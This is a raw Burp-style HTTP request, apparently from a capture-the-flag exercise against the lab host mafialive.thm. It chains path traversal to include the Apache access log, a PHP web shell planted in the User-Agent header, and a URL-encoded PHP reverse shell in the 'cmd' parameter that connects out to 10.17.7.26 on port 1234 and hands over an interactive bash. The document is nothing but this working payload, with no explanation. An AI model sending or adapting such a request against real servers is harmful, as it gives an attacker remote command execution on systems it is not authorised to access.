

```burp
GET /test.php?view=/var/www/html/development_testing/..///////..///////..///////..///////..///////..///////..////////var/log/apache2/access.log&cmd=php+-r+%27%24sock%3Dfsockopen%28%2210.17.7.26%22%2C1234%29%3B%24proc%3Dproc_open%28%22%2Fbin%2Fbash+-i%22%2C+array%280%3D%3E%24sock%2C+1%3D%3E%24sock%2C+2%3D%3E%24sock%29%2C%24pipes%29%3B%27 HTTP/1.1

Host: mafialive.thm

User-Agent: <?php system($_GET['cmd']); ?>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0


```
